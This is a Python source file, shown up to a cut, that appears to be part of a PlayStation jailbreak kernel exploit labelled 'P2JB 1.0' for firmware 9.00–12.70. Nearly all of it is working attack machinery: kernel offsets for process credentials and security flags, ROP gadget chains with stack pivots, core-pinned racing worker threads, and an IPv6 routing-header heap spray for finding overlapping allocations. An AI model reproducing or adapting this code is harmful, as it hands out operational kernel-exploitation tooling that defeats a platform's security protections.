import struct
import time

from constants import CONSOLE_KIND, SELECTED_GADGETS, SELECTED_LIBC, SHARED_VARS, SYSCALL
from sc import sc
from utils.conversion import u64_to_i64
from utils.etc import alloc
from utils.ref import get_ref_addr
from utils.unsafe import readuint, writeuint
_SCREEN_KW = ("***", "COMPLETE", "LEAK PHASE", "spawned", "leak ~",
              "LEAK DONE", "DEBUG MENU", "FATAL", "EXCEPTION",
              "please retry", "ELF loader", "please wait")


def _log_noop(*_a, **_k):
    pass


try:
    from utils import rp as _rp
    _ext_log = getattr(_rp, "log", None)
    if getattr(_ext_log, "_p2jb_quiet", False):
        log = _ext_log
    elif callable(_ext_log):
        _screen_log = _ext_log

        def log(*a):
            try:
                _m = " ".join(str(x) for x in a)
                for _kw in _SCREEN_KW:
                    if _kw in _m:
                        _screen_log(_m)
                        break
            except Exception:
                pass
    else:
        log = _log_noop
except Exception:
    log = _log_noop


P2JB_VERSION = "P2JB 1.0"

POC_ARG = 0x800000000000

UMTX_OP_WAIT = 2
UMTX_OP_WAKE = 3


PAGE_SIZE          = 0x4000

AF_UNIX            = 1
AF_INET6           = 28
SOCK_STREAM        = 1
SOCK_DGRAM         = 2
IPPROTO_UDP        = 17
IPPROTO_IPV6       = 41
IPV6_RTHDR         = 51
IPV6_PKTINFO       = 46

SOL_SOCKET         = 0xFFFF
SO_SNDBUF          = 0x1001

F_SETFL            = 4
O_NONBLOCK         = 4

MAIN_CORE          = 4
MAIN_RTPRIO        = 256

IOV_THREAD_NUM     = 4
UIO_THREAD_NUM     = 4
UIO_IOV_COUNT      = 20
MSG_IOV_NUM        = 23

UCRED_SIZE         = 360
NUM_IPV6_SOCKETS   = 64
TRIPLEFREE_ATTEMPTS  = 96
MAX_ROUNDS_TWIN    = 10
MAX_ROUNDS_TRIPLET = 500
FIND_TRIPLET_FAST  = 5000
FREE_FDS_NUM       = 1024
if CONSOLE_KIND == "PS4":
    LEAK_CORES = [1, 2, 3]
else:
    LEAK_CORES = [0, 1, 2, 3]

CLOSE_THREAD_NUM   = 3
CLOSE_CORES        = [0, 1, 2]

UIO_SYSSPACE       = 1
SYSTEM_AUTHID      = 0x4800000000010003


EXTRA_SYSCALLS = {
    "recvmsg":            0x1B,
    "socketpair":         0x87,
    "kqueue":             0x16A,
    "kqueueex":           0x8D,
    "readv":              0x78,
    "writev":             0x79,
    "setrlimit":          0xC3,
    "getrlimit":          0xC2,
    "mprotect":           0x4A,
    "munmap":             0x49,
    "umtx_op":            0x1C6,
    "fcntl":              0x5C,
    "ioctl":              0x36,
    "cpuset_setaffinity": 0x1E8,
    "cpuset_getaffinity": 0x1E7,
    "rtprio_thread":      0x1D2,
    "sched_yield":        0x14B,
    "setuid":             0x17,
    "open":               0x5,
    "close":              0x6,
    "read":               0x3,
    "write":              0x4,
    "thr_new":            0x1C7,
    "thr_exit":           0x1AF,
    "getsockopt":         0x76,
    "jitshm_create":      0x215,
    "jitshm_alias":       0x216,
    "mmap":               0xCC,
    "nanosleep":          0xF0,
    "dlsym":              0x24F,
    "kill":               0x25,
    "getpid":             0x14,
}
for _name, _num in EXTRA_SYSCALLS.items():
    sc.make_syscall_if_needed(_name, _num)
    SYSCALL[_name] = _num


FW_OFFSETS_P2JB = {
    "9.00":  {"DATA_BASE_ALLPROC":           0x02755D50,
              "DATA_BASE_SECURITY_FLAGS":    0x00D72064,
              "DATA_BASE_KERNEL_PMAP_STORE": 0x02D28B78,
              "DATA_BASE_GVMSPACE":          0x02D8A570},
    "9.05":  {"DATA_BASE_ALLPROC":           0x02755D50,
              "DATA_BASE_SECURITY_FLAGS":    0x00D73064,
              "DATA_BASE_KERNEL_PMAP_STORE": 0x02D28B78,
              "DATA_BASE_GVMSPACE":          0x02D8A570},
    "10.00": {"DATA_BASE_ALLPROC":           0x02765D70,
              "DATA_BASE_SECURITY_FLAGS":    0x00D79064,
              "DATA_BASE_KERNEL_PMAP_STORE": 0x02CF0EF8,
              "DATA_BASE_GVMSPACE":          0x02D52570},
    "11.00": {"DATA_BASE_ALLPROC":           0x02875D70,
              "DATA_BASE_SECURITY_FLAGS":    0x00D8C064,
              "DATA_BASE_KERNEL_PMAP_STORE": 0x02E04F18,
              "DATA_BASE_GVMSPACE":          0x02E66570},
    "12.00": {"DATA_BASE_ALLPROC":           0x02885E00,
              "DATA_BASE_SECURITY_FLAGS":    0x00D83064,
              "DATA_BASE_KERNEL_PMAP_STORE": 0x02E1CFB8,
              "DATA_BASE_GVMSPACE":          0x02E7E570},
}

FW_ALIAS_P2JB = {
    "9.00":  "9.00",
    "9.20":  "9.05", "9.40": "9.05", "9.60": "9.05",
    "10.00": "10.00", "10.01": "10.00", "10.20": "10.00",
    "10.40": "10.00", "10.60": "10.00",
    "11.00": "11.00", "11.20": "11.00", "11.40": "11.00", "11.60": "11.00",
    "12.00": "12.00", "12.02": "12.00", "12.20": "12.00",
    "12.40": "12.00", "12.60": "12.00", "12.70": "12.00",
}


def _resolve_fw_offsets():
    fw = sc.version
    base = FW_ALIAS_P2JB.get(fw)
    if base is None:
        raise Exception(
            "FW %s not supported. Supported: %s" %
            (fw, ", ".join(sorted(FW_ALIAS_P2JB.keys()))))
    return FW_OFFSETS_P2JB[base], base


_FW_OFFSETS, _FW_BASE = _resolve_fw_offsets()


KOFF = {
    "DATA_BASE_ALLPROC":           _FW_OFFSETS["DATA_BASE_ALLPROC"],
    "DATA_BASE_SECURITY_FLAGS":    _FW_OFFSETS["DATA_BASE_SECURITY_FLAGS"],
    "DATA_BASE_KERNEL_PMAP_STORE": _FW_OFFSETS["DATA_BASE_KERNEL_PMAP_STORE"],
    "DATA_BASE_GVMSPACE":          _FW_OFFSETS["DATA_BASE_GVMSPACE"],
    "PROC_PID":           0xBC,
    "PROC_UCRED":         0x40,
    "PROC_FD":            0x48,
    "UCRED_CR_UID":       0x04,
    "UCRED_CR_RUID":      0x08,
    "UCRED_CR_SVUID":     0x0C,
    "UCRED_CR_NGROUPS":   0x10,
    "UCRED_CR_RGID":      0x14,
    "UCRED_CR_SVGID":     0x18,
    "UCRED_CR_SCEAUTHID": 0x58,
    "UCRED_CR_SCECAPS0":  0x60,
    "UCRED_CR_SCECAPS1":  0x68,
    "FILEDESC_OFILES":    0x00,
    "FDESCENTTBL_HDR":    0x08,
    "FILEDESCENT_SIZE":   0x30,
    "FD_CDIR":            0x08,
    "FD_RDIR":            0x10,
    "FD_JDIR":            0x18,
    "KQ_FDP":             0xA8,
    "SO_PCB":             0x18,
    "INPCB_PKTOPTS":      0x120,
    "IP6PO_RTHDR":        0x70,
    "PIPE_SIGIO":         0xD8,
    "PMAP_PML4":          0x20,
    "PMAP_CR3":           0x28,
    "PROC_VM_SPACE":      0x200,
    "VMSPACE_VM_PMAP":    0,
    "VMSPACE_VM_VMID":    0,
    "SIZEOF_GVMSPACE":    0x100,
    "GVMSPACE_START_VA":  0x8,
    "GVMSPACE_SIZE":      0x10,
    "GVMSPACE_PAGE_DIR_VA": 0x38,
}


GPU_READ            = 0x10
GPU_WRITE           = 0x20
MAP_NO_COALESCE     = 0x400000
PROT_READ           = 1
PROT_WRITE          = 2
PROT_EXEC           = 4
LIBKERNEL_HANDLE_GPU = 0x2001

CPU_PDE_SHIFT = {
    "PRESENT": 0, "RW": 1, "USER": 2, "WRITE_THROUGH": 3,
    "CACHE_DISABLE": 4, "ACCESSED": 5, "DIRTY": 6, "PS": 7,
    "GLOBAL": 8, "XOTEXT": 58, "PROTECTION_KEY": 59,
    "EXECUTE_DISABLE": 63,
}
CPU_PDE_MASKS = {
    "PRESENT": 1, "RW": 1, "USER": 1, "WRITE_THROUGH": 1,
    "CACHE_DISABLE": 1, "ACCESSED": 1, "DIRTY": 1, "PS": 1,
    "GLOBAL": 1, "XOTEXT": 1, "PROTECTION_KEY": 0xF,
    "EXECUTE_DISABLE": 1,
}
CPU_PG_PHYS_FRAME = 0x000FFFFFFFFFF000
CPU_PG_PS_FRAME   = 0x000FFFFFFFE00000

GPU_PDE_SHIFT = {
    "VALID": 0, "IS_PTE": 54, "TF": 56, "BLOCK_FRAGMENT_SIZE": 59,
}
GPU_PDE_MASKS = {
    "VALID": 1, "IS_PTE": 1, "TF": 1, "BLOCK_FRAGMENT_SIZE": 0x1F,
}
GPU_PDE_ADDR_MASK = 0x0000FFFFFFFFFFC0


if CONSOLE_KIND == "PS4":
    SELECTED_LIBC.setdefault("setjmp",      0xB07E0)
    SELECTED_LIBC.setdefault("longjmp",     0xB0830)
    SELECTED_LIBC.setdefault("Thrd_create", 0x4D150)
    SELECTED_LIBC.setdefault("Thrd_join",   0x4CF50)
else:
    SELECTED_LIBC.setdefault("setjmp",      0x58F80)
    SELECTED_LIBC.setdefault("longjmp",     0x58FD0)
    SELECTED_LIBC.setdefault("Thrd_create", 0x4BF0)
    SELECTED_LIBC.setdefault("Thrd_join",   0x49F0)


RTP_LOOKUP   = 0
RTP_SET      = 1
PRI_REALTIME = 2


def pin_to_core(core):
    level = 3
    which = 1
    id_ = 0xFFFFFFFFFFFFFFFF
    setsize = 0x10
    mask = alloc(0x10)
    mask[0:2] = struct.pack("<H", 1 << core)
    return sc.syscalls.cpuset_setaffinity(level, which, id_, setsize, mask)


def get_core_index(mask_addr):
    num = readuint(mask_addr, 4)
    pos = 0
    while num > 0:
        num >>= 1
        pos += 1
    return pos - 1


def get_current_core():
    level = 3
    which = 1
    id_ = 0xFFFFFFFFFFFFFFFF
    mask = alloc(0x10)
    sc.syscalls.cpuset_getaffinity(level, which, id_, 0x10, mask)
    return get_core_index(get_ref_addr(mask))


def rtprio(type_, prio=0):
    rtprio_buf = alloc(4)
    rtprio_buf[0:2] = struct.pack("<H", PRI_REALTIME)
    rtprio_buf[2:4] = struct.pack("<H", prio)
    sc.syscalls.rtprio_thread(type_, 0, rtprio_buf)
    if type_ == RTP_LOOKUP:
        return struct.unpack("<H", rtprio_buf[2:4])[0]


def set_rtprio(prio):
    rtprio(RTP_SET, prio)


def get_rtprio():
    return rtprio(RTP_LOOKUP)


class PrimThread(object):
    def __init__(self, sc_, chain):
        self.sc = sc_

        chain.push_syscall(SYSCALL["thr_exit"], 0)
        self.chain = chain

        self._ready = False

    def prepare_structure(self):
        self.ctxbuf = alloc(0x80)
        self.ctxbuf[0x38:0x40] = struct.pack("<Q", self.chain.addr)

        self.thr_handle = alloc(8)

        self._ready = True

    def run(self):
        if not self._ready:
            self.prepare_structure()

        entry_addr = self.sc.libc_addr + SELECTED_GADGETS[
            "mov rsp, [rdi + 0x38]; pop rdi; ret"
        ]
        ret = self.sc.functions.Thrd_create(
            self.thr_handle, entry_addr, self.ctxbuf
        )
        if u64_to_i64(ret) != 0:
            raise Exception(
                "Thrd_create error: rc=%d (thrd_success=0, thrd_nomem=1, "
                "thrd_timedout=2, thrd_busy=3, thrd_error=4)" % u64_to_i64(ret)
            )

        self._ready = False
        self.tid = struct.unpack("<Q", self.thr_handle[0:8])[0]
        return self.tid


def nanosleep_ms(ms):
    ts = alloc(16)
    ts[0:8]  = struct.pack("<Q", ms // 1000)
    ts[8:16] = struct.pack("<Q", (ms % 1000) * 1000000)
    sc.syscalls.nanosleep(ts, 0)


def yieldable_sleep_ms(total_ms, chunk_ms=100):
    remaining = int(total_ms)
    while remaining > 0:
        n = min(chunk_ms, remaining)
        nanosleep_ms(n)
        sc.syscalls.sched_yield()
        remaining -= n


def alloc_string(s):
    if isinstance(s, str):
        s_bytes = s.encode("ascii")
    else:
        s_bytes = s
    b = alloc(len(s_bytes) + 1)
    for i in range(len(s_bytes)):
        ch = s_bytes[i]
        if not isinstance(ch, int):
            ch = ord(ch)
        b[i] = ch
    return b


def sched_yield_n(n):
    for _ in range(n):
        sc.syscalls.sched_yield()


def build_rthdr(buf, size):
    length = ((size >> 3) - 1) & ~1
    actual_size = (length + 1) << 3
    buf[0] = 0
    buf[1] = length & 0xFF
    buf[2] = 0
    buf[3] = (length >> 1) & 0xFF
    return actual_size


def free_rthdr(sd):
    return sc.syscalls.setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0)


class P2JBState(object):
    def __init__(self):
        self.triplets         = [-1, -1, -1]
        self.free_fds         = []
        self.free_fd_idx      = 0
        self.active_uio_mode  = 0
        self.OFF              = KOFF


class WorkerSync(object):
    def __init__(self, n):
        self.n   = n
        self.gen = 0

        size = 64 + 8 + 2 * n * 8 + 128
        backing = alloc(size)
        self._backing = backing
        raw_addr = get_ref_addr(backing)
        align = (64 - (raw_addr % 64)) % 64
        self.cmd      = raw_addr + align
        self.finished = self.cmd + 8
        self.awake    = self.finished + n * 8

        writeuint(self.cmd, 0, 8)
        for i in range(n):
            writeuint(self.finished + i * 8, 0, 8)
            writeuint(self.awake    + i * 8, 0, 8)

        self.wait_val_slots = [0] * n

    def signal(self):
        nxt = self.gen + 1
        self.gen = nxt
        for i in range(self.n):
            writeuint(self.finished + i * 8, 0, 8)
            writeuint(self.awake    + i * 8, 0, 8)
        for i in range(self.n):
            if self.wait_val_slots[i]:
                writeuint(self.wait_val_slots[i], nxt, 8)
        writeuint(self.cmd, nxt, 8)
        deadline = time.time() + 5.0
        while True:
            sc.syscalls.umtx_op(
                self.cmd, UMTX_OP_WAKE, 0x7FFFFFFF, 0, 0
            )
            all_awake = True
            stuck = -1
            for i in range(self.n):
                if readuint(self.awake + i * 8, 8) == 0:
                    all_awake = False
                    stuck = i
                    break
            if all_awake:
                return
            if time.time() > deadline:
                raise Exception(
                    "WorkerSync.signal: WAKE timeout - worker %d/%d never "
                    "reached WAIT exit (gen=%d)" % (stuck, self.n, nxt)
                )
            sc.syscalls.sched_yield()

    def wait(self, timeout_ms=15000):
        deadline = time.time() + (timeout_ms / 1000.0)
        while True:
            done = True
            stuck = -1
            for i in range(self.n):
                if readuint(self.finished + i * 8, 8) == 0:
                    done = False
                    stuck = i
                    break
            if done:
                return
            if time.time() > deadline:
                raise Exception(
                    "WorkerSync.wait: timeout - worker %d/%d stalled "
                    "(no response in %dms)" % (stuck, self.n, timeout_ms)
                )
            sc.syscalls.sched_yield()


if CONSOLE_KIND == "PS4":
    _BLOCK_RDX_OFF      = 72
    _BLOCK_SYSCALL_OFF  = 112
    _BLOCK_SIZE         = 120
else:
    _BLOCK_RDX_OFF      = 112
    _BLOCK_SYSCALL_OFF  = 152
    _BLOCK_SIZE         = 160


def _push_syscall_block_tracked(chain, sysnum, rdi=0, rsi=0, rdx=0,
                                rcx=0, r8=0, r9=0):
    block_start = chain.index

    if CONSOLE_KIND == "PS4":
        chain.push_gadget("pop r9; ret")
        chain.push_value(r9)
        r9_container_addr = r9
    else:
        r9_container = alloc(0x20)
        r9_container_addr = get_ref_addr(r9_container)
        r9_container[0x18:0x20] = struct.pack("<Q", r9)
        chain.push_gadget("pop rax; ret")
        chain.push_value(r9_container_addr)
        chain.push_gadget("pop rsi; ret")
        chain.push_value(0)
        chain.push_gadget("pop r8; ret")
        chain.push_value(r9_container_addr)
        chain.push_gadget(
            "mov r9, [rax+rsi+0x18]; xor eax, eax; mov [r8], r9; ret"
        )

    chain.push_gadget("pop rax; ret")
    chain.push_value(sysnum)
    chain.push_gadget("pop rdi; ret")
    chain.push_value(rdi)
    chain.push_gadget("pop rsi; ret")
    chain.push_value(rsi)
    chain.push_gadget("pop rdx; ret")
    chain.push_value(rdx)
    chain.push_gadget("pop rcx; ret")
    chain.push_value(rcx)
    chain.push_gadget("pop r8; ret")
    chain.push_value(r8)
    chain.push_value(sc.syscall_addr)

    return {
        "block_start":       block_start,
        "r9_container_addr": r9_container_addr,
        "sysnum":            sysnum,
        "rdi": rdi, "rsi": rsi, "rdx": rdx, "rcx": rcx, "r8": r8,
    }


def _repair_slots(block_info, skip_rdx=False):
    bi = block_info
    g_pop_rax = sc.exec_addr + SELECTED_GADGETS["pop rax; ret"]
    g_pop_rdi = sc.exec_addr + SELECTED_GADGETS["pop rdi; ret"]
    g_pop_rsi = sc.exec_addr + SELECTED_GADGETS["pop rsi; ret"]
    g_pop_rdx = sc.exec_addr + SELECTED_GADGETS["pop rdx; ret"]
    g_pop_rcx = sc.exec_addr + SELECTED_GADGETS["pop rcx; ret"]
    g_pop_r8  = sc.exec_addr + SELECTED_GADGETS["pop r8; ret"]

    slots = []
    if CONSOLE_KIND == "PS4":
        g_pop_r9 = sc.exec_addr + SELECTED_GADGETS["pop r9; ret"]
        slots = [
            (0,   g_pop_r9),
            (8,   bi["r9_container_addr"]),
            (16,  g_pop_rax),
            (24,  bi["sysnum"]),
            (32,  g_pop_rdi),
            (40,  bi["rdi"]),
            (48,  g_pop_rsi),
            (56,  bi["rsi"]),
            (64,  g_pop_rdx),
            (72,  bi["rdx"]),
            (80,  g_pop_rcx),
            (88,  bi["rcx"]),
            (96,  g_pop_r8),
            (104, bi["r8"]),
            (112, sc.syscall_addr),
        ]
    else:
        g_mov_r9 = sc.exec_addr + SELECTED_GADGETS[
            "mov r9, [rax+rsi+0x18]; xor eax, eax; mov [r8], r9; ret"
        ]
        cont = bi["r9_container_addr"]
        slots = [
            (0,   g_pop_rax),
            (8,   cont),
            (16,  g_pop_rsi),
            (24,  0),
            (32,  g_pop_r8),
            (40,  cont),
            (48,  g_mov_r9),
            (56,  g_pop_rax),
            (64,  bi["sysnum"]),
            (72,  g_pop_rdi),
            (80,  bi["rdi"]),
            (88,  g_pop_rsi),
            (96,  bi["rsi"]),
            (104, g_pop_rdx),
            (112, bi["rdx"]),
            (120, g_pop_rcx),
            (128, bi["rcx"]),
            (136, g_pop_r8),
            (144, bi["r8"]),
            (152, sc.syscall_addr),
        ]
    if skip_rdx:
        slots = [(o, v) for (o, v) in slots if o != _BLOCK_RDX_OFF]
    return slots


def _push_repair_section(chain, block_addr, slots):
    for off, val in slots:
        chain.push_gadget("pop rsi; ret")
        chain.push_value(block_addr + off)
        chain.push_gadget("pop rax; ret")
        chain.push_value(val)
        chain.push_gadget("mov [rsi], rax; ret")


def build_worker_chain(ws, wid, fd, iov_ptr, sysnum):
    from ropchain import ROPChain
    chain = ROPChain(sc, size=0x4000)

    awake_addr    = ws.awake    + wid * 8
    finished_addr = ws.finished + wid * 8
    count_arg     = 0 if sysnum == SYSCALL["recvmsg"] else UIO_IOV_COUNT

    chain.push_value(0)

    cpu_mask = alloc(16)
    cpu_mask[0:2] = struct.pack("<H", 1 << MAIN_CORE)
    chain.push_syscall(SYSCALL["cpuset_setaffinity"], 3, 1,
                       0xFFFFFFFFFFFFFFFF, 0x10, cpu_mask)
    rt_params = alloc(4)
    rt_params[0:2] = struct.pack("<H", PRI_REALTIME)
    rt_params[2:4] = struct.pack("<H", MAIN_RTPRIO)
    chain.push_syscall(SYSCALL["rtprio_thread"], RTP_SET, 0, rt_params)

    wait_block = _push_syscall_block_tracked(
        chain, SYSCALL["umtx_op"], ws.cmd, UMTX_OP_WAIT, 0, 0, 0,
    )
    wait_val_slot_addr = chain.addr + wait_block["block_start"] + _BLOCK_RDX_OFF
    pivot_lands_at = wait_block["block_start"] - 8

    awake_block_start = chain.index
    chain.push_gadget("pop rsi; ret")
    chain.push_value(awake_addr)
    chain.push_gadget("pop rax; ret")
    chain.push_value(1)
    chain.push_gadget("mov [rsi], rax; ret")

    work_block = _push_syscall_block_tracked(
        chain, sysnum, fd, iov_ptr, count_arg,
    )

    g_pop_rax     = sc.exec_addr + SELECTED_GADGETS["pop rax; ret"]
    g_pop_rsi     = sc.exec_addr + SELECTED_GADGETS["pop rsi; ret"]
    g_mov_rsi_rax = sc.exec_addr + SELECTED_GADGETS["mov [rsi], rax; ret"]

    _push_repair_section(
        chain, chain.addr + wait_block["block_start"],
        _repair_slots(wait_block, skip_rdx=True),
    )

    ab = chain.addr + awake_block_start
    _push_repair_section(chain, ab, [
        (0,  g_pop_rsi),
        (8,  awake_addr),
        (16, g_pop_rax),
        (24, 1),
        (32, g_mov_rsi_rax),
    ])

    _push_repair_section(
        chain, chain.addr + work_block["block_start"],
        _repair_slots(work_block, skip_rdx=False),
    )

    chain.push_gadget("pop rsi; ret")
    chain.push_value(finished_addr)
    chain.push_gadget("pop rax; ret")
    chain.push_value(1)
    chain.push_gadget("mov [rsi], rax; ret")

    pivot_ctxbuf = alloc(0x80)
    pivot_ctxbuf[0x38:0x40] = struct.pack("<Q", chain.addr + pivot_lands_at)
    chain.push_gadget("pop rdi; ret")
    chain.push_value(get_ref_addr(pivot_ctxbuf))
    chain.push_value(
        sc.libc_addr + SELECTED_GADGETS["mov rsp, [rdi + 0x38]; pop rdi; ret"]
    )

    ws.wait_val_slots[wid] = wait_val_slot_addr

    return {
        "chain":         chain,
        "pivot_ctxbuf":  pivot_ctxbuf,
        "wait_val_slot": wait_val_slot_addr,
        "loop_start":    chain.addr + pivot_lands_at + 8,
    }


def build_close_chain(ws, wid, core):
    from ropchain import ROPChain
    chain = ROPChain(sc, size=0x4000)

    awake_addr    = ws.awake    + wid * 8
    finished_addr = ws.finished + wid * 8

    chain.push_value(0)

    cpu_mask = alloc(16)
    cpu_mask[0:2] = struct.pack("<H", 1 << core)
    chain.push_syscall(SYSCALL["cpuset_setaffinity"], 3, 1,
                       0xFFFFFFFFFFFFFFFF, 0x10, cpu_mask)
    rt_params = alloc(4)
    rt_params[0:2] = struct.pack("<H", PRI_REALTIME)
    rt_params[2:4] = struct.pack("<H", MAIN_RTPRIO)
    chain.push_syscall(SYSCALL["rtprio_thread"], RTP_SET, 0, rt_params)

    wait_block = _push_syscall_block_tracked(
        chain, SYSCALL["umtx_op"], ws.cmd, UMTX_OP_WAIT, 0, 0, 0,
    )
    wait_val_slot_addr = chain.addr + wait_block["block_start"] + _BLOCK_RDX_OFF
    pivot_lands_at = wait_block["block_start"] - 8

    awake_block_start = chain.index
    chain.push_gadget("pop rsi; ret")
    chain.push_value(awake_addr)
    chain.push_gadget("pop rax; ret")
    chain.push_value(1)
    chain.push_gadget("mov [rsi], rax; ret")

    close_block = _push_syscall_block_tracked(chain, SYSCALL["close"], 0)
    rdi_off = 40 if CONSOLE_KIND == "PS4" else 80
    fd_slot_addr = chain.addr + close_block["block_start"] + rdi_off

    g_pop_rax     = sc.exec_addr + SELECTED_GADGETS["pop rax; ret"]
    g_pop_rsi     = sc.exec_addr + SELECTED_GADGETS["pop rsi; ret"]
    g_mov_rsi_rax = sc.exec_addr + SELECTED_GADGETS["mov [rsi], rax; ret"]

    _push_repair_section(
        chain, chain.addr + wait_block["block_start"],
        _repair_slots(wait_block, skip_rdx=True),
    )

    ab = chain.addr + awake_block_start
    _push_repair_section(chain, ab, [
        (0,  g_pop_rsi),
        (8,  awake_addr),
        (16, g_pop_rax),
        (24, 1),
        (32, g_mov_rsi_rax),
    ])

    close_repair_slots = _repair_slots(close_block, skip_rdx=False)
    close_repair_slots = [(o, v) for (o, v) in close_repair_slots
                          if o != rdi_off]
    _push_repair_section(
        chain, chain.addr + close_block["block_start"],
        close_repair_slots,
    )

    chain.push_gadget("pop rsi; ret")
    chain.push_value(finished_addr)
    chain.push_gadget("pop rax; ret")
    chain.push_value(1)
    chain.push_gadget("mov [rsi], rax; ret")

    pivot_ctxbuf = alloc(0x80)
    pivot_ctxbuf[0x38:0x40] = struct.pack("<Q", chain.addr + pivot_lands_at)
    chain.push_gadget("pop rdi; ret")
    chain.push_value(get_ref_addr(pivot_ctxbuf))
    chain.push_value(
        sc.libc_addr + SELECTED_GADGETS["mov rsp, [rdi + 0x38]; pop rdi; ret"]
    )

    ws.wait_val_slots[wid] = wait_val_slot_addr

    return {
        "chain":         chain,
        "pivot_ctxbuf":  pivot_ctxbuf,
        "wait_val_slot": wait_val_slot_addr,
        "fd_slot":       fd_slot_addr,
        "loop_start":    chain.addr + pivot_lands_at + 8,
    }


def setup_cpu_masks(S):
    S.cpu_mask = alloc(16)
    S.cpu_mask[0:2] = struct.pack("<H", 1 << MAIN_CORE)
    S.rt_params = alloc(4)
    S.rt_params[0:2] = struct.pack("<H", PRI_REALTIME)
    S.rt_params[2:4] = struct.pack("<H", MAIN_RTPRIO)


def apply_main_thread_pinning(S):
    sc.syscalls.cpuset_setaffinity(3, 1, 0xFFFFFFFFFFFFFFFF, 0x10, S.cpu_mask)
    sc.syscalls.rtprio_thread(RTP_SET, 0, S.rt_params)


def setup_worker_sockets(S):
    sv = alloc(8)
    sc.syscalls.socketpair(AF_UNIX, SOCK_STREAM, 0, sv)
    S.iov_sock_a = struct.unpack("<I", sv[0:4])[0]
    S.iov_sock_b = struct.unpack("<I", sv[4:8])[0]

    sv2 = alloc(8)
    sc.syscalls.socketpair(AF_UNIX, SOCK_STREAM, 0, sv2)
    S.uio_sock_a = struct.unpack("<I", sv2[0:4])[0]
    S.uio_sock_b = struct.unpack("<I", sv2[4:8])[0]


def setup_iov_buffers(S):
    S.recvmsg_iovecs = alloc(MSG_IOV_NUM * 16)
    S.recvmsg_iovecs[0:8]  = struct.pack("<Q", 1)
    S.recvmsg_iovecs[8:16] = struct.pack("<Q", 1)

    S.recvmsg_hdr = alloc(0x38)
    S.recvmsg_hdr[0x10:0x18] = struct.pack("<Q", get_ref_addr(S.recvmsg_iovecs))
    S.recvmsg_hdr[0x18:0x1C] = struct.pack("<I", MSG_IOV_NUM)


def setup_uio_buffers(S):
    S.uio_read_buf  = alloc(64)
    for i in range(0, 64, 8):
        S.uio_read_buf[i:i+8] = struct.pack("<Q", 0x4141414141414141)
    S.uio_write_buf = alloc(64)

    iov_size = UIO_IOV_COUNT * 16

    S.uio_iov_read = alloc(iov_size)
    S.uio_iov_read[0:8]  = struct.pack("<Q", get_ref_addr(S.uio_read_buf))
    S.uio_iov_read[8:16] = struct.pack("<Q", 8)

    S.uio_iov_write = alloc(iov_size)
    S.uio_iov_write[0:8]  = struct.pack("<Q", get_ref_addr(S.uio_write_buf))
    S.uio_iov_write[8:16] = struct.pack("<Q", 8)

    S.kread_result_bufs = []
    for _ in range(UIO_THREAD_NUM):
        S.kread_result_bufs.append(alloc(64))

    S.kread_sndbuf  = alloc(4)
    S.kwrite_sndbuf = alloc(4)

    S.scratch        = alloc(16)
    S.scratch_big    = alloc(0x4000)
    S.dummy_byte     = alloc(8)
    S.len_out        = alloc(4)
    S.rthdr_readback = alloc(360)


def setup_pipes_kernrw(S):
    pipefds_m = alloc(8)
    sc.syscalls.pipe(pipefds_m)
    S.master_rfd = struct.unpack("<I", pipefds_m[0:4])[0]
    S.master_wfd = struct.unpack("<I", pipefds_m[4:8])[0]

    pipefds_v = alloc(8)
    sc.syscalls.pipe(pipefds_v)
    S.victim_rfd = struct.unpack("<I", pipefds_v[0:4])[0]
    S.victim_wfd = struct.unpack("<I", pipefds_v[4:8])[0]

    for fd in (S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd):
        sc.syscalls.fcntl(fd, F_SETFL, O_NONBLOCK)


def setup_iov_workers(S):
    if not hasattr(S, "workers"):
        S.workers = []
    for wid in range(IOV_THREAD_NUM):
        wc = build_worker_chain(
            S.iov_ws, wid, S.iov_sock_a,
            get_ref_addr(S.recvmsg_hdr), SYSCALL["recvmsg"],
        )
        prim = PrimThread(sc, wc["chain"])
        prim.run()
        S.workers.append((wc, prim))


def setup_uio_workers(S):
    if not hasattr(S, "workers"):
        S.workers = []
    for wid in range(UIO_THREAD_NUM):
        wc = build_worker_chain(
            S.uio_read_ws, wid, S.uio_sock_b,
            get_ref_addr(S.uio_iov_read), SYSCALL["writev"],
        )
        prim = PrimThread(sc, wc["chain"])
        prim.run()
        S.workers.append((wc, prim))
    for wid in range(UIO_THREAD_NUM):
        wc = build_worker_chain(
            S.uio_write_ws, wid, S.uio_sock_a,
            get_ref_addr(S.uio_iov_write), SYSCALL["readv"],
        )
        prim = PrimThread(sc, wc["chain"])
        prim.run()
        S.workers.append((wc, prim))


def setup_race_workers(S):
    if not hasattr(S, "close_ws"):
        S.close_ws = WorkerSync(CLOSE_THREAD_NUM)
    S.race_workers = []
    for wid, core in enumerate(CLOSE_CORES):
        cc = build_close_chain(S.close_ws, wid, core)
        prim = PrimThread(sc, cc["chain"])
        prim.run()
        S.race_workers.append((cc, prim))


RTHDR_TAG = 0x13370000


def _rthdr_set_at(S, idx):
    return sc.syscalls.setsockopt(
        S.ipv6_sockets[idx], IPPROTO_IPV6, IPV6_RTHDR,
        S.rthdr_spray, S.rthdr_spray_len,
    )


def _rthdr_get_tag_at(S, idx):
    S.tag_len[0:4] = struct.pack("<I", 8)
    rc = u64_to_i64(sc.syscalls.getsockopt(
        S.ipv6_sockets[idx], IPPROTO_IPV6, IPV6_RTHDR,
        S.tag_buf, S.tag_len,
    ))
    if rc == -1:
        return None
    return struct.unpack("<I", bytes(S.tag_buf[4:8]))[0]


def find_twins(S, max_rounds=10):
    for round_ in range(1, max_rounds + 1):
        for i in range(S.ipv6_count):
            S.rthdr_spray[4:8] = struct.pack("<I", RTHDR_TAG + i)
            _rthdr_set_at(S, i)
        for i in range(S.ipv6_count):
            v = _rthdr_get_tag_at(S, i)
            if v is None:
                continue
            j = v & 0xFFFF
            if (v & 0xFFFF0000) == RTHDR_TAG and i != j and j < S.ipv6_count:
                return (i, j)
        if round_ % 50 == 0:
            sc.syscalls.sched_yield()
    return None


_RAW_PRIM_INIT = {"done": False, "fpu_ctrl": 0, "mxcsr": 0}


def _init_raw_prim_thread():
    if _RAW_PRIM_INIT["done"]:
        return
    jmp_buf = alloc(0x60)
    sc.functions.setjmp(jmp_buf)
    _RAW_PRIM_INIT["fpu_ctrl"] = struct.unpack("<I", bytes(jmp_buf[0x40:0x44]))[0]
    _RAW_PRIM_INIT["mxcsr"] = struct.unpack("<I", bytes(jmp_buf[0x44:0x48]))[0]
    _RAW_PRIM_INIT["done"] = True


PERS_UNROLL = 2048


def stage0_leak(S, target_total):
    NW = len(LEAK_CORES)
